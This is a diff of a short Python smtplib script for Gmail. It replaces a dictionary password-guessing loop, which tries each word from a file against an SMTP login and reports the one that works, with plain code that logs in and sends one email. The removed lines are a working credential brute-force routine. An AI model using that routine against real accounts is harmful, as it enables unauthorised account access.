@@ -1,18 +1,19 @@
 import smtplib
 
+# gmail server configuration
 smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 
+# Add credentials and the log in
 user = "example@gmail.com"
-with open('words.txt', 'r') as f:
-	passwords = f.readlines()
+password = "secret"
+smtpserver.login(user, password)
 
-for password in passwords:
-	try:
-		smtpserver.login(user, password)
-		print("[+] Password Found: %s" % password)
-		break
+sender = "example@gmail.com"
+recepient = "example2@gmail.com"
 
-	except smtplib.SMTPAuthenticationError:
-		print("[!] Password incorrect: %s" % password)
+message = "Add your message here"
+
+smtpserver.sendmail(sender, recepient , message)
+smtpserver.quit()
